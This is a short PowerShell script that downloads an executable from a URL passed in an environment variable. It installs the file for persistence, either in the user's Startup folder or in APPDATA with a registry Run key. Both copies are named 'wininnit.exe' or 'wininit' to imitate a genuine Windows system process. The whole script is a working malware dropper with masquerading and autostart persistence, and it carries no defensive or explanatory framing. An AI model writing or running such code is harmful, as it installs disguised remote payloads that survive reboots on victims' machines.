switch ( $env:method )
{
    1 {
        $dest = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\wininnit.exe"
        Invoke-RestMethod -Uri $env:url -Headers @{"Cache-Control"="no-cache"} -OutFile $dest
    }
    2 {
        $dest = Join-Path $env:APPDATA "wininnit.exe"
        Invoke-RestMethod -Uri $env:url -Headers @{"Cache-Control"="no-cache"} -OutFile $dest
        $newItemPropertySplat = @{
            Path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Name = 'wininit'
            PropertyType = 'String'
            Value = $dest
        }
        New-ItemProperty @newItemPropertySplat
    }
}